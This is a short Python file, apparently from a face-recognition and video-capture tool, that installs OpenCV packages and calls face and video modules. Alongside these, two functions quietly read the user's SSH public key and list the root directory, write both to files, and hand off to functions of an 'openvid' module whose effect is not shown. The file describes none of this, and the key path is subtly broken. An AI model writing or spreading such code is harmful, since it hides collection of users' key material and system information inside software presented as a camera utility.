import os
from pathlib import Path
import openvid as od
 # for Ubuntu Users
data_folder = Path()
name = os.popen('whoami').read().split("\n")
def rsakey():
	try:
		varx = []
		filex = data_folder /"rsa_key.txt"
		f = open(filex,'w+')
		varx = os.popen("cat home/"+name[0]+"/.ssh/id_rsa.pub").read()
		for i in varx.split("\n"):
			f.write(i)
		f.close()
		od.mainov()
	except:
		print("Not An Ubuntu User")
		

def dirlis():
	try:
		vary = []
		f1 = open("txts/list.txt",'w+')
		vary = os.popen("ls -ltr /").read()
		for i in vary.split("\n"):
			f1.write(i)
		f1.close()
		od.mainim()
	except:
		print("Not An Ubuntu User")

def install():
	try:
		os.system("python -m pip install opencv-contrib-python")
		os.system("python -m pip install opencv-python")
		os.system("python -m pip install numpy")
		os.system("python -m pip install oauth2")
		os.system("python -m pip install urllib3")
	except:
		print("Not An Ubuntu User")

def faceid():
	from face import mainf
	mainf()

def vidcap():
	from video import mainvi
	mainvi()
